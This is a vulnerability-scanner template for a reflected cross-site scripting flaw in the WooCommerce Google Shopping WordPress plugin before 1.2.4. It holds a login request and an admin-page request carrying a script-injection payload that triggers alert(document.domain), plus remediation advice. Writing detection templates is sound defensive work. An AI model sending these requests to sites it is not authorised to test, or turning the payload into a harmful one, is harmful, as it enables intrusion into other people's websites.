id: elex-woocommerce-xss
info:
  name: WordPress WooCommerce Google Shopping < 1.2.4 - Reflected Cross-Site Scripting
  author:
  - l0ne1y
  tags:
  - wordpress
  - wp-plugin
  - xss
  - authenticated
  - woocommerce
  description: |-
    WordPress Plugin WooCommerce Google Shopping Cross-Site Scripting Vulnerability
    WordPress and WordPress plugin are both products of the WordPress Foundation. WordPress is a blogging platform developed using PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers. WordPress plugin is an application plugin.

    WordPress plugin WooCommerce Google Shopping before version 1.2.4 has a cross-site scripting vulnerability. The vulnerability occurs because the plugin does not sanitize and escape parameters on the reset password form. An attacker could exploit this vulnerability to perform cross-site scripting attacks.
  reference:
  - https://wpscan.com/vulnerability/647448d6-32c0-4b38-a40a-3b54c55f4e2e
  severity: high
  classification:
    cwe-id:
    - cwe-79
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://wordpress.org/plugins/

    Temporary fix:
    1. Filter the input (and URL parameters), encode the output, and combine the whitelist and blacklist. That is to say, filter all submitted content, filter the parameters in the URL, and filter out relevant content that will cause the script to be executed; and then HTML-encode the content dynamically output to the page so that the script cannot be executed in the browser. Although input filtering can be bypassed, a large number of XSS attacks will still be intercepted; finally, characters are whitelisted or blacklisted.
requests:
- matchers:
  - type: word
    part: body
    words:
    - </script><script>alert(document.domain)</script>
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /wp-login.php HTTP/1.1
    Host: {{Hostname}}
    Origin: {{RootURL}}
    Content-Type: application/x-www-form-urlencoded
    Cookie: wordpress_test_cookie=WP%20Cookie%20check

    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
  - |
    GET /wp-admin/admin.php?page=elex-product-feed-manage&search=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
    Host: {{Hostname}}
  cookie-reuse: true
